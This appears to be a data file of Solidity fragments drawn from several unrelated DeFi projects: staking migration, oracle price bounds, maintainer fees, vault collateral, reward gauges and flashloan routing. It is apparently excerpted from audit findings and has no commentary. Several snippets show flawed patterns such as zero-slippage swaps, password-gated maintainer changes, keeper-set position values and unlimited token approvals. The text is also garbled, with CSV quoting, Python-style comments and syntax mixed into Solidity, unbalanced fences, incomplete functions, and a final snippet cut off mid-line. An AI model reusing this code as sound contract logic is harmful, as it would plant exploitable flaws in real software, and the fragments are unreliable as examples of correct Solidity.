  emit StakeDeposited(subjectType, subject, staker, stakeValue);\n    _allocator.depositAllocation(activeSharesId, subjectType, subject, staker, stakeValue, sharesValue);\n    return sharesValue;\n}\n```\n```\nfunction migrate(\n    uint8 oldSubjectType,\n    uint256 oldSubject,\n    uint8 newSubjectType,\n    uint256 newSubject,\n    address staker\n) external onlyRole(SCANNER_2_NODE_RUNNER_MIGRATOR_ROLE) {\n    if (oldSubjectType!= SCANNER_SUBJECT) {\n        revert InvalidSubjectType(oldSubjectType);\n    }\n    if (newSubjectType!= NODE_RUNNER_SUBJECT) {\n        revert InvalidSubjectType(newSubjectType);\n    }\n    if (isFrozen(oldSubjectType, oldSubject)) {\n        revert FrozenSubject();\n    }\n\n    uint256 oldSharesId = FortaStakingUtils.subjectToActive(oldSubjectType, oldSubject);\n    uint256 oldShares = balanceOf(staker, oldSharesId);\n    uint256 stake = activeSharesToStake(oldSharesId, oldShares);\n    uint256 newSharesId = FortaStakingUtils.subjectToActive(newSubjectType, newSubject);\n    uint256 newShares = stakeToActiveShares(newSharesId, stake);\n\n    _activeStake.burn(oldSharesId, stake);\n    _activeStake.mint(newSharesId, stake);\n    _burn(staker, oldSharesId, oldShares);\n    _mint(staker, newSharesId, newShares, new bytes(0));\n    emit StakeDeposited(newSubjectType, newSubject, staker, stake);\n    _allocator.depositAllocation(newSharesId, newSubjectType, newSubject, staker, stake, newShares);\n}\n```\n```\nfunction initiateWithdrawal(\n    uint8 subjectType,\n    uint256 subject,\n    uint256 sharesValue\n) external onlyValidSubjectType(subjectType) returns (uint64) {\n    address staker = _msgSender();\n    uint256 activeSharesId = FortaStakingUtils.subjectToActive(subjectType, subject);\n    if (balanceOf(staker, activeSharesId) == 0) {\n        revert NoActiveShares();\n    }\n\n    uint64 deadline = SafeCast.toUint64(block.timestamp) + _withdrawalDelay;\n\n    _lockingDelay[activeSharesId][staker].setDeadline(deadline);\n\n    uint256 activeShares = Math.min(sharesValue, balanceOf(staker, activeSharesId));\n    uint256 stakeValue = activeSharesToStake(activeSharesId, activeShares);\n    uint256 inactiveShares = stakeToInactiveShares(FortaStakingUtils.activeToInactive(activeSharesId), stakeValue);\n\n    SubjectStakeAgency agency = getSubjectTypeAgency(subjectType);\n\n    _activeStake.burn(activeSharesId, stakeValue);\n    _inactiveStake.mint(FortaStakingUtils.activeToInactive(activeSharesId), stakeValue);\n    _burn(staker, activeSharesId, activeShares);\n    _mint(staker, FortaStakingUtils.activeToInactive(activeSharesId), inactiveShares, new bytes(0));\n\n    if (agency == SubjectStakeAgency.DELEGATED || agency == SubjectStakeAgency.DELEGATOR) {\n        _allocator.withdrawAllocation(activeSharesId, subjectType, subject, staker, stakeValue, activeShares);\n    }\n}"
```\nif (fees[1].sinceEpoch!= 0) {\n    if (Accumulators.getCurrentEpochNumber() < fees[1].sinceEpoch + delegationParamsEpochDelay) {\n        revert SetDelegationFeeNotReady();\n    }\n}\nif (fees[1].sinceEpoch!= 0) {\n    fees[0] = fees[1];\n}\n```
"```\nfor (uint256 i = 0; i < epochNumbers.length; i++) {\n    if (_claimedRewardsPerEpoch[shareId][epochNumbers[i]][_msgSender()]) {\n        revert AlreadyClaimed();\n    }\n    _claimedRewardsPerEpoch[shareId][epochNumbers[i]][_msgSender()] = true;\n    uint256 epochRewards = _availableReward(shareId, isDelegator, epochNumbers[i], _msgSender());\n    SafeERC20.safeTransfer(rewardsToken, _msgSender(), epochRewards);\n    emit ClaimedRewards(subjectType, subjectId, _msgSender(), epochNumbers[i], epochRewards);\n}\n```"
"```\nif (subjectGateway.totalStakeFor(_subjectType, _subjectId) == 0):\n    revert ZeroAmount(""subject stake"")\n```\n```\nif (_subjectType!= proposals[_proposalId].subjectType || \n    _subjectId!= proposals[_proposalId].subjectId) {\n    _unfreeze(_proposalId);\n    _freeze(_subjectType, _subjectId);\n}\n```"
"```\n* SCANNER_SUBJECT --> DIRECT\n```\n```\nelse if (subjectType == SCANNER_SUBJECT) {\n    return SubjectStakeAgency.MANAGED;\n```\n```\n/**\n * Assigns the job of running an agent to a scanner.\n * @dev currently only allowed for DISPATCHER_ROLE (Assigner software).\n * @param agentId ERC1155 token id of the agent.\n * @param scannerId ERC1155 token id of the scanner.\n */\n```\n```\nfunction scannerIdToAddress(uint256 scannerId) public pure returns (address) {\n    return address(uint160(scannerId));\n}\n```\n```\n@param nodeRunnerId\nIf set as 0, a new NodeRunnerRegistry ERC721 will be minted to nodeRunner (but it must not own any prior)\n```\n```\n@param nodeRunnerId\nIf set as 0, a new NodeRunnerRegistry ERC721 will be minted to nodeRunner (but it must not own any prior)\n```"
"```\nuint256 maxPrice = curPrice + \n    ((curPrice * \n        self.PERIOD_PRICE_INCREASE_LIMIT * \n        _periodsSinceUpdate) / PERCENTAGE_DENOMINATOR);\n\nuint256 minPrice = curPrice - \n    ((curPrice * \n        self.PERIOD_PRICE_DECREASE_LIMIT * \n        _periodsSinceUpdate) / PERCENTAGE_DENOMINATOR);\n\nrequire(\n    _newPrice >= minPrice && _newPrice <= maxPrice,\n    ""OracleUtils: price is insane""\n)\n```"
"```\nGEM.newProposal(\n    proposal.CONTROLLER,\n    2,\n    proposal.NAME,\n    4,\n    ""weeks""\n)\n```\nrequire(\n    duration <= MAX_PROPOSAL_DURATION,\n    ""GeodeUtils: duration exceeds MAX_PROPOSAL_DURATION""\n);\n```"
```\nmapping(uint256 => mapping(address => uint256)) private _balances;\n```\n```\nmapping(address => mapping(address => uint256)) private _allowances;\n```
"```\nfunction initialize(\n    address _GOVERNANCE,\n    address _gETH,\n    address _ORACLE_POSITION,\n    address _DEFAULT_gETH_INTERFACE,\n    address _DEFAULT_DWP,\n    address _DEFAULT_LP_TOKEN,\n    address _MINI_GOVERNANCE_POSITION,\n    uint256 _GOVERNANCE_TAX,\n    uint256 _COMET_TAX,\n    uint256 _MAX_MAINTAINER_FEE,\n    uint256 _BOOSTRAP_PERIOD\n) public virtual override initializer {\n    _ReentrancyGuard_init();\n    _Pausable_init();\n    _ERC1155Holder_init();\n    _UUPSUpgradeable_init();\n\n    GEODE.SENATE = _GOVERNANCE;\n    GEODE.GOVERNANCE = _GOVERNANCE;\n    GEODE.GOVERNANCE_TAX = _GOVERNANCE_TAX;\n    GEODE.MAX_GOVERNANCE_TAX = _GOVERNANCE_TAX;\n    GEODE.SENATE_EXPIRY = type(uint256).max;\n\n    STAKEPOOL.GOVERNANCE = _GOVERNANCE;\n    STAKEPOOL.gETH = IgETH(_gETH);\n    STAKEPOOL.TELESCOPE.gETH = IgETH(_gETH);\n    STAKEPOOL.TELESCOPE.ORACLE_POSITION = _ORACLE_POSITION;\n    STAKEPOOL.TELESCOPE.MONOPOLY_THRESHOLD = 20000;\n\n    updateStakingParams(\n        _DEFAULT_gETH_INTERFACE,\n        _DEFAULT_DWP,\n        _DEFAULT_LP_TOKEN,\n        _MAX_MAINTAINER_FEE,\n        _BOOSTRAP_PERIOD,\n        type(uint256).max,\n        type(uint256).max,\n        _COMET_TAX,\n        3 days\n    );\n}\n```\n```\nfunction updateStakingParams(\n    address _DEFAULT_gETH_INTERFACE,\n    address _DEFAULT_DWP,\n    address _DEFAULT_LP_TOKEN,\n    uint256 _MAX_MAINTAINER_FEE,\n    uint256 _BOOSTRAP_PERIOD,\n    uint256 _PERIOD_PRICE_INCREASE_LIMIT,\n    uint256 _PERIOD_PRICE_DECREASE_LIMIT,\n    uint256 _COMET_TAX,\n    uint256 _BOOST_SWITCH_LATENCY\n) public virtual override {\n    require(\n        msg.sender == GEODE.GOVERNANCE,\n        ""Portal: sender not GOVERNANCE""\n    );\n}\n```"
"```\nfunction changeMaintainer(\n    bytes calldata password,\n    bytes32 newPasswordHash,\n    address newMaintainer\n)\n    external\n    virtual\n    override\n    onlyPortal\n    whenNotPaused\n    returns (bool success)\n{\n    require(\n        SELF.PASSWORD_HASH == bytes32(0) ||\n        SELF.PASSWORD_HASH ==\n        keccak256(abi.encodePacked(SELF.ID, password))\n    );\n    SELF.PASSWORD_HASH = newPasswordHash;\n\n    _refreshSenate(newMaintainer);\n\n    success = true;\n}\n```"
"```\nmodifier initiator(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 _TYPE,\n    uint256 _id,\n    address _maintainer\n) {\n    require(\n        msg.sender == DataStoreUtils.DataStore.readAddressForId(_id, ""CONTROLLER""),\n        ""MaintainerUtils: sender NOT CONTROLLER""\n    );\n    require(\n        DataStoreUtils.DataStore.readUintForId(_id, ""TYPE"") == _TYPE,\n        ""MaintainerUtils: id NOT correct TYPE""\n    );\n    require(\n        DataStoreUtils.DataStore.readUintForId(_id, ""initiated"") == 0,\n        ""MaintainerUtils: already initiated""\n    );\n\n    DataStoreUtils.DataStore.writeAddressForId(_id, ""maintainer"", _maintainer);\n\n    //;\n\n    DataStoreUtils.DataStore.writeUintForId(_id, ""initiated"", block.timestamp);\n\n    emit IdInitiated(_id, _TYPE);\n}\n```"
"```\n/**\n * @notice allows imprisoning an Operator if the validator have not been exited until expectedExit\n * @dev anyone can call this function\n * @dev if operator has given enough allowance, they can rotate the validators to avoid being imprisoned\n */\nfunction blameOperator(\n    StakePool storage self,\n    DataStoreUtils.DataStore storage DATASTORE,\n    bytes calldata pk\n) external {\n    if (\n        block.timestamp > self.TELESCOPE._validators[pk].expectedExit &&\n        self.TELESCOPE._validators[pk].state!= 3\n    ) {\n        OracleUtils.imprison(\n            DATASTORE,\n            self.TELESCOPE._validators[pk].operatorId\n        );\n    }\n}\n```"
"```\nfunction switchMaintainerFee(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 id,\n    uint256 newFee\n) external {\n    DATASTORE.writeUintForId(\n        id,\n        ""priorFee"",\n        DATASTORE.readUintForId(id, ""fee"")\n    );\n    DATASTORE.writeUintForId(\n        id,\n        ""feeSwitch"",\n        block.timestamp + FEE_SWITCH_LATENCY\n    );\n    DATASTORE.writeUintForId(id, ""fee"", newFee);\n\n    emit MaintainerFeeSwitched(\n        id,\n        newFee,\n        block.timestamp + FEE_SWITCH_LATENCY\n    );\n}\n```\n```\nfunction getMaintainerFee(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 id\n) internal view returns (uint256 fee) {\n    if (DATASTORE.readUintForId(id, ""feeSwitch"") > block.timestamp) {\n        return DATASTORE.readUintForId(id, ""priorFee"");\n    }\n    return DATASTORE.readUintForId(id, ""fee"");\n}\n```"
"```\nGEM._setSenate(newSenate, block.timestamp + SENATE_VALIDITY)\n```\n```\nself.SENATE_EXPIRY = block.timestamp + _senatePeriod;\n```"
"```\nrequire(\n  (DATASTORE.readUintForId(operatorId, ""totalActiveValidators"") +\n  pubkeys.length) <= self.TELESCOPE.MONOPOLY_THRESHOLD,\n  ""StakeUtils: IceBear does NOT like monopolies""\n);\n```"
```\nself._validators[_pk].state == 2\n```\n```\nself._validators[_pk].state == 3\n```
"```\nfunction initiatePlanet(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256[3] memory uintSpecs,\n    address[5] memory addressSpecs,\n    string[2] calldata interfaceSpecs\n)\n    external\n    initiator(DATASTORE, 5, uintSpecs[0], addressSpecs[1])\n    returns (\n        address miniGovernance,\n        address gInterface,\n        address withdrawalPool\n    )\n```\n```\nfunction initiateComet(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 id,\n    uint256 fee,\n    address maintainer\n) external {\n    initiator(DATASTORE, 6, id, maintainer);\n}\n```\n```\nfunction initiateOperator(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 id,\n    uint256 fee,\n    address maintainer\n) external {\n    initiator(DATASTORE, 4, id, maintainer);\n}\n```\n```\nmodifier initiator(\n    DataStoreUtils.DataStore storage DATASTORE,\n    uint256 _TYPE,\n    uint256 _id,\n    address _maintainer\n) {\n    require(\n        msg.sender == DataStoreUtils.DataStore.readAddressForId(_id, ""CONTROLLER""),\n        ""MaintainerUtils: sender NOT CONTROLLER""\n    );\n    require(\n        DataStoreUtils.DataStore.readUintForId(_id, ""TYPE"") == _TYPE,\n        ""MaintainerUtils: id NOT correct TYPE""\n    );\n    require(\n        DataStoreUtils.DataStore.readUintForId(_id, ""initiated"") == 0,\n        ""MaintainerUtils: already initiated""\n    );\n\n    DataStoreUtils.DataStore.writeAddressForId(_id, ""maintainer"", _maintainer);\n\n    //;\n\n    DataStoreUtils.DataStore.writeUintForId(_id, ""initiated"", block.timestamp);\n\n    emit IdInitiated(_id, _TYPE);\n}\n```"
"```\nDATASTORE.subUintForId(poolId, ""surplus"", spentSurplus)\nself.gETH.burn(address(this), poolId, spentGeth - gEthDonation)\n\nif self.TELESCOPE._isOracleActive():\n    dailyBufferKey = DataStoreUtils.getKey(\n        block.timestamp - (block.timestamp % OracleUtils.ORACLE_PERIOD),\n        ""burnBuffer""\n    )\n    DATASTORE.addUintForId(poolId, dailyBufferKey, spentGeth)\n```"
"```\nuint256 arb = \n    withdrawalPoolById(DATASTORE, poolId)\n   .calculateSwap(0, 1, cumBal);\n```"
```\nDataStoreUtils.DataStore private DATASTORE;\nGeodeUtils.Universe private GEODE;\nStakeUtils.StakePool private STAKEPOOL;\n```\n```\nstruct DataStore {\n    mapping(uint256 => uint256[]) allIdsByType;\n    mapping(bytes32 => uint256) uintData;\n    mapping(bytes32 => bytes) bytesData;\n    mapping(bytes32 => address) addressData;\n}\n```
```\nint256 settledVaultValue = settlementRate.convertToUnderlying(residualAssetCashBalance)\n   .add(totalStrategyTokenValueAtSettlement);\n\nstrategyTokenClaim = totalAccountValue.mul(vaultState.totalStrategyTokens.toInt())\n   .div(settledVaultValue).toUint();\n\nassetCashClaim = totalAccountValue.mul(residualAssetCashBalance)\n   .div(settledVaultValue);\n```\n```\nuint256 vaultSharesToLiquidator;\nvaultSharesToLiquidator = vaultAccount.tempCashBalance.toUint()\n   .mul(vaultConfig.liquidationRate.toUint())\n   .mul(vaultAccount.vaultShares)\n   .div(vaultShareValue.toUint())\n   .div(uint256(Constants.RATE_PRECISION));\n```\n```\nVaultSecondaryBorrowStorage storage balance = \n    LibStorage.getVaultSecondaryBorrow()[vaultConfig.vault][maturity][currencyId];\n\nuint256 totalfCashBorrowed = balance.totalfCashBorrowed;\nuint256 totalAccountDebtShares = balance.totalAccountDebtShares;\n\nfCashToLend = debtSharesToRepay.mul(totalfCashBorrowed).div(totalAccountDebtShares).toInt();\n```
```\nif (accountMaturity!= 0) {\n    require(accountMaturity < maturity);\n}
"```\nfunction checkCollateralRatio(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    VaultAccount memory vaultAccount\n) internal view {\n    (int256 collateralRatio,) = calculateCollateralRatio(\n        vaultConfig,\n        vaultState,\n        vaultAccount.account,\n        vaultAccount.vaultShares,\n        vaultAccount.fCash\n```\n```\nfunction calculateCollateralRatio(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    address account,\n    uint256 vaultShares,\n    int256 fCash\n) internal view returns (int256 collateralRatio, int256 vaultShareValue) {\n    vaultShareValue = vaultState.getCashValueOfShare(vaultConfig, account, vaultShares);\n\n    int256 debtOutstanding = vaultConfig.assetRate.convertFromUnderlying(fCash.neg());\n```\n```\nfunction getCashValueOfShare(\n    VaultState memory vaultState,\n    VaultConfig memory vaultConfig,\n    address account,\n    uint256 vaultShares\n) internal view returns (int256 assetCashValue) {\n    if (vaultShares == 0) {\n        return 0;\n    }\n    (\n        uint256 assetCash,\n        uint256 strategyTokens\n    ) = getPoolShare(vaultState, vaultShares);\n    int256 underlyingInternalStrategyTokenValue = _getStrategyTokenValueUnderlyingInternal(\n        vaultConfig.borrowCurrencyId,\n        vaultConfig.vault,\n        account,\n        strategyTokens,\n        vaultState.maturity\n    );\n}\n```\nfunction _getStrategyTokenValueUnderlyingInternal(\n    uint16 currencyId,\n    address vault,\n    address account,\n    uint256 strategyTokens,\n    uint256 maturity\n) private view returns (int256) {\n    Token memory token = TokenHandler.getUnderlyingToken(currencyId);\n    if (token.decimals == 0) {\n        token = TokenHandler.getAssetToken(currencyId);\n    }\n    return token.convertToInternal(\n        IStrategyVault(vault).convertStrategyToUnderlying(account, strategyTokens, maturity)\n    );\n}\n```"
```\nrequire(\n    currencies[0]!= 0 &&\n    currencies[1]!= 0\n);\n```
"```\nfunction updateUsedBorrowCapacity(\n    address vault,\n    uint16 currencyId,\n    int256 netfCash\n) internal returns (int256 totalUsedBorrowCapacity) {\n    VaultBorrowCapacityStorage storage cap = LibStorage.getVaultBorrowCapacity()[vault][currencyId];\n\n    totalUsedBorrowCapacity = int256(uint256(cap.totalUsedBorrowCapacity)).sub(netfCash);\n\n    if (netfCash < 0) {\n        require(totalUsedBorrowCapacity <= int256(uint256(cap.maxBorrowCapacity)), ""Max Capacity"");\n    }\n}"
"```\nuint256 strategyTokensMinted = \nvaultConfig.deposit(\n    vaultAccount.account, \n    vaultAccount.tempCashBalance, \n    vaultState.maturity, \n    additionalUnderlyingExternal, \n    vaultData\n);\n```"
"```\nfunction _executeTrade(\n    uint16 dexId,\n    Trade memory trade\n) internal returns (uint256 amountSold, uint256 amountBought) {\n    (bool success, bytes memory result) = nProxy(payable(address(TRADING_MODULE))).getImplementation()\n       .delegatecall(abi.encodeWithSelector(ITradingModule.executeTrade.selector, dexId, trade));\n    require(success);\n    (amountSold, amountBought) = abi.decode(result, (uint256, uint256));\n}\n\nfunction _executeTradeWithDynamicSlippage(\n    uint16 dexId,\n    Trade memory trade,\n    uint32 dynamicSlippageLimit\n) internal returns (uint256 amountSold, uint256 amountBought) {\n    (bool success, bytes memory result) = nProxy(payable(address(TRADING_MODULE))).getImplementation()\n       .delegatecall(abi.encodeWithSelector(\n            ITradingModule.executeTradeWithDynamicSlippage.selector,\n            dexId,\n            trade,\n            dynamicSlippageLimit\n        ));\n    require(success);\n    (amountSold, amountBought) = abi.decode(result, (uint256, uint256));\n}\n```\n```\nif (vaultState.totalStrategyTokens == 0) {\n    NOTIONAL.settleVault(address(this), maturity);\n}\n```"
```\nuint256 currentSharePrice = ethStEthPool.getVirtualPrice();\nif (currentSharePrice > prevSharePrice) {\n    uint256 contractLpTokenBalance = lpToken.balanceOf(address(this));\n    uint256 totalLpBalance = contractLpTokenBalance + \n        baseRewardPool.balanceOf(address(this));\n    uint256 yieldEarned = (currentSharePrice - prevSharePrice) * \n        totalLpBalance;\n```\n```\nuint256 lpTokenEarned = yieldEarned / NORMALIZATION_FACTOR;  # 18 decimal from virtual price\n```
"```\nfunction totalFunds() public view override returns (uint256, uint256) {\n    return ConvexPositionHandler.positionInWantToken();\n}\n```\n```\nfunction positionInWantToken()\n    public\n    view\n    override\n    returns (uint256, uint256)\n{\n    (\n        uint256 stakedLpBalanceInETH,\n        uint256 lpBalanceInETH,\n        uint256 ethBalance\n    ) = _getTotalBalancesInETH(true);\n\n    return (\n        stakedLpBalanceInETH + lpBalanceInETH + ethBalance,\n        block.number\n    );\n}\n```\n```\nfunction _getTotalBalancesInETH(bool useVirtualPrice)\n    internal\n    view\n    returns (\n        uint256 stakedLpBalance,\n        uint256 lpTokenBalance,\n        uint256 ethBalance\n    ) {\n    uint256 stakedLpBalanceRaw = baseRewardPool.balanceOf(address(this));\n    uint256 lpTokenBalanceRaw = lpToken.balanceOf(address(this));\n\n    uint256 totalLpBalance = stakedLpBalanceRaw + lpTokenBalanceRaw;\n\n    uint256 totalLpBalanceInETH = useVirtualPrice\n       ? _lpTokenValueInETHFromVirtualPrice(totalLpBalance)\n        : _lpTokenValueInETH(totalLpBalance);\n\n    lpTokenBalance = useVirtualPrice\n       ? _lpTokenValueInETHFromVirtualPrice(lpTokenBalanceRaw)\n        : _lpTokenValueInETH(lpTokenBalanceRaw);\n\n    stakedLpBalance = totalLpBalanceInETH - lpTokenBalance;\n    ethBalance = address(this).balance;\n}\n```"
"```\nmodifier onlyAuthorized() {\n    require(\n        (msg.sender == L2CrossDomainMessenger &&\n            OptimismL2Wrapper.messageSender() == positionHandlerL1) ||\n        msg.sender == keeper,\n        ""ONLY_AUTHORIZED""\n    );\n}\n```\n```\nfunction closePosition(bool toSettle) public override onlyAuthorized {\n    LyraController._closePosition(toSettle);\n    UniswapV3Controller._estimateAndSwap(\n        false,\n        LyraController.sUSD.balanceOf(address(this))\n    );\n}\n\n// MAINTAINANCE FUNCTIONS\n\n/// @notice Sweep tokens\n/// @param _token Address of the token to sweep\nfunction sweep(address _token) public override onlyAuthorized {\n    IERC20(_token).transfer(\n        msg.sender,\n        IERC20(_token).balanceOf(address(this))\n    );\n}\n\n/// @notice socket registry setter\n/// @param _socketRegistry new address of socket registry\nfunction setSocketRegistry(address _socketRegistry) public onlyAuthorized {\n    socketRegistry = _socketRegistry;\n}\n\n/// @notice keeper setter\n/// @param _keeper new keeper address\nfunction setKeeper(address _keeper) public onlyAuthorized {\n    keeper = _keeper;\n}\n```"
"```\nfunction _swapLidoForWETH(uint256 amountToSwap) internal {\n    IUniswapSwapRouter.ExactInputSingleParams memory params = IUniswapSwapRouter.ExactInputSingleParams(\n        {\n            tokenIn: address(ldo),\n            tokenOut: address(weth),\n            fee: UNISWAP_FEE,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountToSwap,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        }\n    );\n    uniswapRouter.exactInputSingle(params);\n}\n```\n```\nif (cvxBalance > 0) {\n    cvxeth.exchange(1, 0, cvxBalance, 0, false);\n}\n\nif (crvBalance > 0) {\n    crveth.exchange(1, 0, crvBalance, 0, false);\n}\n```"
"```\naddress[] memory rewardTokens = harvester.rewardTokens();\n\nfor (uint256 i = 0; i < rewardTokens.length; i++) {\n    uint256 balance = IERC20(rewardTokens[i]).balanceOf(address(this));\n\n    if (balance > 0) {\n        IERC20(rewardTokens[i]).safeTransfer(\n            address(harvester),\n            balance\n        );\n    }\n}\n\nharvester.harvest();\n```\n```\nfunction rewardTokens() external pure override returns (address[] memory) {\n    address[] memory rewards = new address[](2);\n    rewards[0] = address(crv);\n    rewards[1] = address(cvx);\n    return rewards;\n}\n```"
"```\nshares = totalSupply() > 0\n   ? (totalSupply() * amountIn) / totalVaultFunds()\n    : amountIn;\n```\n```\nfunction totalVaultFunds() public view returns (uint256) {\n    return IERC20(wantToken).balanceOf(address(this)) + totalExecutorFunds();\n}\n```\n```\nfunction totalFunds() public view override returns (uint256, uint256) {\n    return ConvexPositionHandler.positionInWantToken();\n}\n```\n```\nfunction positionInWantToken()\n    public\n    view\n    override\n    returns (uint256, uint256)\n{\n    (\n        uint256 stakedLpBalanceInETH,\n        uint256 lpBalanceInETH,\n        uint256 ethBalance\n    ) = _getTotalBalancesInETH(true);\n\n    return (\n        stakedLpBalanceInETH + lpBalanceInETH + ethBalance,\n        block.number\n    );\n}\n```\n```\nfunction totalFunds()\n    public\n    view\n    override\n    returns (uint256 posValue, uint256 lastUpdatedBlock)\n{\n    return (\n        positionInWantToken.posValue +\n        IERC20(vaultWantToken()).balanceOf(address(this))\n    );\n}\n```\n```\nfunction setPosValue(uint256 _posValue) public onlyKeeper {\n    LyraPositionHandler._setPosValue(_posValue);\n}\n```\n```\nfunction _setPosValue(uint256 _posValue) internal {\n    positionInWantToken.posValue = _posValue;\n    positionInWantToken.lastUpdatedBlock = block.number;\n}\n```"
"```\nIERC20(vaultWantToken()).approve(vault, MAX_INT);\n```\n```\nIERC20(vaultInfo.tokenAddress).approve(\n    vaultAddress,\n    type(uint256).max\n)\n```\nIERC20(LP_TOKEN).safeApprove(ETH_STETH_POOL, type(uint256).max);\n\nIERC20(LP_TOKEN).safeApprove(\n    address(CONVEX_BOOSTER),\n    type(uint256).max\n)\n```\n```\ncrv.safeApprove(address(crveth), type(uint256).max);\ncrv.safeApprove(address(crveth), type(uint256).max);  # max approve CVX to CVX/ETH pool on curve\ncvx.safeApprove(address(cvxeth), type(uint256).max);\ncvx.safeApprove(address(cvxeth), type(uint256).max);  # max approve LDO to uniswap swap router\nldo.safeApprove(address(uniswapRouter), type(uint256).max);\n```\n```\nIERC20(wantTokenL2).safeApprove(\n    address(UniswapV3Controller.uniswapRouter),\n    type(uint256).max\n);\n\nLyraController.sUSD.safeApprove(\n    address(UniswapV3Controller.uniswapRouter),\n    type(uint256).max\n);"
"```\nrequire(\n    IERC20(vaultInfo.vaultAddress).totalSupply() +\n        pendingDeposit -\n        pendingWithdrawal +\n        amountIn <=\n        vaultInfo.maxAmount,\n    ""MAX_LIMIT_EXCEEDED""\n);\n```"
"```\nfunction confirmDeposit() public override onlyKeeper {\n    require(depositStatus.inProcess, ""DEPOSIT_COMPLETED"");\n    _confirmDeposit();\n    depositStatus.inProcess = false;\n}\n```\n```\nfunction confirmWithdraw() public override onlyKeeper {\n    require(withdrawalStatus.inProcess, ""WIHDRW_COMPLETED"");\n    _confirmWithdraw();\n    withdrawalStatus.inProcess = false;\n}\n```"
"```\ngaugeQueuedRewards[gauge] = QueuedRewards({\n    priorCycleRewards: queuedRewards.priorCycleRewards + completedRewards,\n    cycleRewards: uint112(nextRewards),\n    storedCycle: currentCycle\n})\n```\nassert queuedRewards.storedCycle == 0 or queuedRewards.storedCycle >= lastCycle\n```"
```\nuint112 completedRewards = \n    queuedRewards.storedCycle == lastCycle? \n    queuedRewards.cycleRewards : 0;\n```\n```\npriorCycleRewards = queuedRewards.priorCycleRewards + completedRewards\n```
"```\nfunction delegateBySig(\n    address delegatee,\n    uint256 nonce,\n    uint256 expiry,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n) public {\n    require(block.timestamp <= expiry, ""ERC20MultiVotes: signature expired"");\n    address signer = ecrecover(\n        keccak256(\n            abi.encodePacked(\n                ""\x19\x01"",\n                DOMAIN_SEPARATOR(),\n                keccak256(abi.encode(\n                    DELEGATION_TYPEHASH,\n                    delegatee,\n                    nonce,\n                    expiry\n                ))\n            )\n        ),\n        v,\n        r,\n        s\n    );\n    require(nonce == nonces[signer]++, ""ERC20MultiVotes: invalid nonce"");\n    _delegate(signer, delegatee);\n}\n```"
"```\nfunction setMaxGauges(uint256 newMax) external requiresAuth {\n    uint256 oldMax = maxGauges;\n    maxGauges = newMax;\n\n    emit MaxGaugesUpdate(oldMax, newMax);\n}\n```"
"```\nfunction _decrementGaugeWeight(\n    address user,\n    address gauge,\n    uint112 weight,\n    uint32 cycle\n) internal {\n    uint112 oldWeight = getUserGaugeWeight[user][gauge];\n\n    getUserGaugeWeight[user][gauge] = oldWeight - weight;\n    if (oldWeight == weight) {\n        assert(userGauges[user].remove(gauge));\n    }\n```\n```\nuint112 oldWeight = getUserGaugeWeight[user][gauge];\n\ngetUserGaugeWeight[user][gauge] = oldWeight - weight;\n```\n```\nassert(_userGauges[user].remove(gauge))\n```"
"```\nfunction _undelegate(\n    address delegator,\n    address delegatee,\n    uint256 amount\n) internal virtual {\n    uint256 newDelegates = _delegatesVotesCount[delegator][delegatee] - amount;\n\n    if (newDelegates == 0) {\n        assert(_delegates[delegator].remove(delegatee));\n    }\n```\n```\nuint256 newDelegates = _delegatesVotesCount[delegator][delegatee] - amount;\n```\n```\nassert(_delegates[delegator].remove(delegatee))  # Should never fail.\n```"
"```\nfunction emitVotingBalances(address[] calldata accounts) external {\n    uint256 size = accounts.length;\n\n    for (uint256 i = 0; i < size; i++) {\n        emit DelegateVotesChanged(accounts[i], 0, getVotes(accounts[i]));\n    }\n}"
"```\nfunction setMaxGauges(uint256 newMax) external requiresAuth {\n    uint256 oldMax = maxGauges;\n    maxGauges = newMax;\n\n    emit MaxGaugesUpdate(oldMax, newMax);\n}\n```"
```\nuint256 timeSinceMigration = finalMigrationTime - lastClaimTime;\n\nuint256 incentiveRate = \n    timeSinceMigration\n       .mul(uint256(Constants.INTERNAL_TOKEN_PRECISION))\n       .mul(finalEmissionRatePerYear).mul(uint256(Constants.INTERNAL_TOKEN_PRECISION))\n       .div(Constants.YEAR);\n\nuint256 avgTotalSupply = finalTotalIntegralSupply.sub(lastClaimIntegralSupply).div(timeSinceMigration);\n```
```\nrequire(accumulatedNOTEPerNToken < uint128.max);\n```\n```\nrequire(blockTime < type(uint32).max)\n```\n```\nrequire(totalSupply <= uint96.max);\nrequire(blockTime <= uint32.max);\n```
"```\n/**\n * @dev Routing Function for Flashloan Provider\n * @param info: struct information for flashLoan\n * @param _flashnum: integer identifier of flashloan provider\n */\nfunction initiateFlashloan(FlashLoan.Info calldata info, uint8 _flashnum) external isAuthorized override {\n    if (_flashnum == 0) {\n        _initiateGeistFlashLoan(info);\n    } else if (_flashnum == 2) {\n        _initiateCreamFlashLoan(info);\n    } else {\n        revert(Errors.VL_INVALID_FLASH_NUMBER);\n    }\n}\n```\n```\nmodifier isAuthorized() {\n    require(\n        msg.sender == _fujiAdmin.getController() ||\n        msg.sender == _fujiAdmin.getFliquidator() ||\n        msg.sender == owner(),\n        Errors.VL_NOT_AUTHORIZED\n    );\n}\n```\n```\n/**\n * @dev Initiates an CreamFinance flashloan.\n * @param info: data to be passed between functions executing flashloan logic\n */\nfunction _initiateCreamFlashLoan(FlashLoan.Info calldata info) internal {\n    address crToken = info.asset == _FTM\n       ? 0xd528697008aC67A21818751A5e3c58C8daE54696\n        : _crMappings.addressMapping(info.asset);\n\n    // Prepare data for flashloan execution\n    bytes memory params = abi.encode(info);\n\n    // Initialize Instance of Cream crLendingContract\n    ICTokenFlashloan(crToken).flashLoan(address(this), address(this), info.amount, params);\n}\n```\n```\naddress initiator,\n```\n```\nfunction onFlashLoan(\n    address sender,\n    address underlying,\n    uint256 amount,\n    uint256 fee,\n    bytes calldata params\n) external override returns (bytes32) {\n    address crToken = underlying == _WFTM\n       ? 0xd528697008aC67A21818751A5e3c58C8daE54696\n        : _crMappings.addressMapping(underlying);\n    require(msg.sender == crToken && address(this) == sender, 